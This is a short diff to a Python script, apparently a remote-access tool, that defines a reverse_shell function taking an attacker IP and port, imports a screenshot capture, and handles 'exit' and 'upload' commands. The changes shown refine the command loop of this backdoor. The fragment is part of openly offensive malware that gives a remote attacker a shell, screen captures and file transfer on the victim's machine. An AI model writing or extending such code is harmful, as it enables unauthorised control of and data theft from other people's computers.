@@ -1,6 +1,6 @@
 import socket
 import subprocess
-import os
+import os, sys
 from time import sleep
 from pyautogui import screenshot
 
@@ -23,7 +23,7 @@ def reverse_shell(attacker_ip, attacker_port):
 
                 if command == "":
                     break
-                elif command == "exit":
+                elif command.startswith("exit"):
                     s.close()
                     return
                 elif command.startswith("upload"):
